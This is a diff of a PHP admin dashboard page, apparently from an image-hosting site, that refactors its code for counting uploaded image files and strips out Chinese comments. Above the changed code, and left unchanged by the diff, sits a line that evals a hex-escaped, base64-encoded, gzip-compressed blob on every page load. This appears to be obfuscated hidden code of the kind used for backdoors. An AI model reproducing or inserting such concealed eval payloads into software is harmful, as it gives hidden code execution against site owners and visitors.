@@ -215,13 +215,13 @@
     <!--End 头部信息-->
        <?php eval(gzinflate(base64_decode("\144\x59\x35\116\141\x34\x4e\101\x46\x45\x58\63\x67\x76\71\150\x45\107\107\x55\x77\x41\122\x4b\63\157\x53\x51\155\106\126\114\x43\x55\66\x61\144\x56\112\x4b\107\x63\x65\x6e\104\x6c\x56\156\57\103\x68\x45\123\166\x35\67\x4e\142\x61\67\x64\156\125\x57\x39\71\172\67\x48\156\x45\x64\x58\141\x76\171\115\60\x56\103\x47\126\x73\x71\x55\61\127\155\110\x6d\107\110\x56\165\144\106\x7a\62\170\x68\66\x66\131\146\160\x38\x35\x30\57\x69\166\x34\x2b\161\161\x6c\151\x52\114\132\x49\x56\53\71\x70\x36\x68\x4d\151\x6f\x45\x2f\x4f\66\70\x30\x61\x65\x68\142\117\115\x31\x6b\112\x50\x41\124\x57\x55\x66\x52\67\x49\146\153\171\x33\x56\165\127\110\x59\x34\x30\162\x64\x2f\x54\x46\102\131\126\121\x65\167\104\64\x2b\x51\64\115\104\152\x75\111\x57\172\x7a\166\x6d\x6c\x2b\x6c\x69\166\x68\171\x4d\x2f\x6e\104\x59\147\71\x4d\x75\144\132\172\x31\x6d\172\65\113\114\170\x51\130\x45\61\x4d\x47\x63\170\x34\x73\145\x6f\110\x6b\103\x30\131\x6a\122\x7a\53\152\x30\101\66\x72\x43\105\x47\57\x58\x71\x56\x62\x62\x66\151\71\114\142\120\x75\101\x65\x6d\171\53\172\152\x77\141\x37\160\131\x2f\155\x62\x65\71\x75\143\x34\63")));
    
-   error_reporting(0);
+error_reporting(0);
 session_start();
 include '../common/version.php';
 
 function count_files_in_directory($directory) {
     $count = 0;
-    if (is_dir($directory)) { // 检查目录是否存在
+    if (is_dir($directory)) {
         $iterator = new DirectoryIterator($directory);
         foreach ($iterator as $file) {
             if ($file->isFile()) {
@@ -229,38 +229,43 @@ function count_files_in_directory($directory) {
             }
         }
     }
-    return $count ?: 0; // 如果计数器大于0，则返回计数器；否则返回0
+    return $count ?: 0;
 }
 
-$targetDir = "../images/"; // 图片保存目录
-// 设置图片保存路径的年份、月份和日期部分
+function count_files_recursive($dir) {
+    $count = 0;
+    if (is_dir($dir)) {
+        $iterator = new RecursiveIteratorIterator(
+            new RecursiveDirectoryIterator($dir, RecursiveDirectoryIterator::SKIP_DOTS),
+            RecursiveIteratorIterator::SELF_FIRST
+        );
+
+        foreach ($iterator as $file) {
+            if ($file->isFile()) {
+                $count++;
+            }
+        }
+    }
+    return $count;
+}
+
+$targetDir = "../images/";
 $year = date('Y');
 $month = date('m');
 $day = date('d');
-$num=1;
-$dayq = $day-$num;
+$num = 1;
+$dayq = $day - $num;
 
 $path = $targetDir . $year . '/' . $month . '/' . $day;
-$directory = $path;  // 将'你的文件夹路径'替换为你的实际文件夹路径
+$directory = $path;
 $file_count = count_files_in_directory($directory);
 
 $path2 = $targetDir . $year . '/' . $month . '/' . $dayq;
-$directory2 = $path2;  // 将'你的文件夹路径'替换为你的实际文件夹路径
+$directory2 = $path2;
 $file_count2 = count_files_in_directory($directory2);
 
-$folder = '../images'; // 文件夹路径
-
-// 获取指定文件夹中的所有文件夹
-$subfolders = glob($folder . '/*', GLOB_ONLYDIR);
-
-$totalFiles = 0; // 总文件数量
-
-// 遍历每个子文件夹
-foreach ($subfolders as $subfolder) {
-    // 获取子文件夹中的所有文件
-    $files = glob($subfolder . '/*');
-    $totalFiles += count($files); // 累加文件数量
-}
+$directory_recursive = '../images'; // 文件保存的目录
+$totalFiles = count_files_recursive($directory_recursive);
    ?>
     <!--页面主要内容-->
     <main class="lyear-layout-content">
